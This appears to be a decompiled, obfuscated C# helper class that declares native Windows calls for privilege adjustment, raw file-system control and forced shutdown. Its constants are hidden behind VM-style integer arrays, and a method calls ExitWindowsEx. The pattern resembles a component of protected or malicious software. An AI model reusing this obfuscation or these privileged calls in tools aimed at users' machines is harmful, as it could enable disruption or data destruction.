using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

namespace ns0;

public static class GClass6
{
	public struct GStruct0
	{
		public uint uint_0;

		public IntPtr intptr_0;
	}

	public struct GStruct1 : IDisposable
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public IntPtr intptr_0;

		public GStruct1(string string_0)
		{
			ushort_0 = (ushort)(string_0.Length * C2V1PCy9F.V3SsUmjVJAqQh(new int[25]
			{
				90, 914126512, 190, 210, 220, 90, 914126512, 190, 200, 220,
				240, 90, 1086384794, 190, 210, 220, 90, 1086384794, 190, 200,
				220, 240, 240, 230, 180
			}, 0, 0));
			ushort_1 = (ushort)(ushort_0 + C2V1PCy9F.V3SsUmjVJAqQh(new int[25]
			{
				90, 914126512, 190, 210, 220, 90, 914126512, 190, 200, 220,
				240, 90, 1086384794, 190, 210, 220, 90, 1086384794, 190, 200,
				220, 240, 240, 230, 180
			}, 0, 0));
			intptr_0 = Marshal.StringToHGlobalUni(string_0);
		}

		public void Dispose()
		{
			int i = 0;
			object[] array = new object[7]
			{
				new int[12]
				{
					90, 1533845162, 90, 821827789, 10, 90, 1870570948, 10, 90, 68723505,
					10, 180
				},
				new int[6] { 90, -68723378, 90, 68723505, 10, 180 },
				new int[6] { 90, -68723297, 90, 68723505, 10, 180 },
				new int[9] { 90, -1939294410, 90, 1870570948, 10, 90, 68723505, 10, 180 },
				new int[12]
				{
					90, 1533845086, 90, 821827789, 10, 90, 1870570948, 10, 90, 68723505,
					10, 180
				},
				new int[9] { 90, -1939294290, 90, 1870570948, 10, 90, 68723505, 10, 180 },
				new int[9] { 90, -1939294257, 90, 1870570948, 10, 90, 68723505, 10, 180 }
			};
			for (; i < 7; i++)
			{
				switch (C2V1PCy9F.V3SsUmjVJAqQh((int[])array[i], 0, 0))
				{
				case 163:
					intptr_0 = IntPtr.Zero;
					break;
				case 127:
					Marshal.FreeHGlobal(intptr_0);
					break;
				}
			}
		}

		public override string ToString()
		{
			return Marshal.PtrToStringUni(intptr_0);
		}
	}

	public struct GStruct2
	{
		public ulong ulong_0;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public ulong ulong_1;

		public IntPtr intptr_2;

		public IntPtr intptr_3;
	}

	public struct GStruct3
	{
		public ulong ulong_0;

		public ulong ulong_1;
	}

	private const string string_0 = "ntdll.dll";

	private const string string_1 = "kernel32.dll";

	private const string string_2 = "user32.dll";

	[DllImport("ntdll.dll")]
	public static extern uint NtOpenFile(out SafeFileHandle safeFileHandle_0, ulong ulong_0, ref GStruct2 gstruct2_0, ref GStruct0 gstruct0_0, ulong ulong_1, ulong ulong_2);

	[DllImport("ntdll.dll")]
	public static extern uint NtFsControlFile(SafeFileHandle safeFileHandle_0, IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, ref GStruct0 gstruct0_0, ulong ulong_0, IntPtr intptr_3, ulong ulong_1, IntPtr intptr_4, ulong ulong_2);

	[DllImport("ntdll.dll")]
	public static extern ulong RtlNtStatusToDosError(ulong ulong_0);

	[DllImport("ntdll.dll")]
	public static extern int RtlAdjustPrivilege(ulong ulong_0, bool bool_0, bool bool_1, ref bool bool_2);

	[DllImport("kernel32.dll")]
	public static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	public static extern bool GetFileSizeEx(SafeFileHandle safeFileHandle_0, out ulong ulong_0);

	[DllImport("kernel32.dll")]
	public static extern uint GetLastError();

	[DllImport("user32.dll", ExactSpelling = true)]
	private static extern bool ExitWindowsEx(uint uint_0, int int_0);

	public static string smethod_0(ulong ulong_0)
	{
		return new Win32Exception((int)RtlNtStatusToDosError(ulong_0)).ToString();
	}

	public static void smethod_1()
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[6] { 90, -68723455, 90, 68723505, 10, 180 },
			new int[9] { 90, -1939294417, 90, 1870570948, 10, 90, 68723505, 10, 180 },
			new int[9] { 90, -1939294259, 90, 1870570948, 10, 90, 68723505, 10, 180 },
			new int[6] { 90, -68723402, 90, 68723505, 10, 180 },
			new int[9] { 90, -1939294310, 90, 1870570948, 10, 90, 68723505, 10, 180 }
		};
		for (; i < 5; i++)
		{
			switch (C2V1PCy9F.V3SsUmjVJAqQh((int[])array[i], 0, 0))
			{
			case 103:
				ExitWindowsEx((uint)C2V1PCy9F.V3SsUmjVJAqQh(new int[13]
				{
					90, 914126512, 190, 210, 220, 90, 914126512, 190, 200, 220,
					240, 230, 180
				}, 0, 0), C2V1PCy9F.V3SsUmjVJAqQh(new int[13]
				{
					90, 914126512, 90, 914126512, 190, 210, 220, 190, 210, 220,
					270, 230, 180
				}, 0, 0));
				break;
			}
		}
	}
}
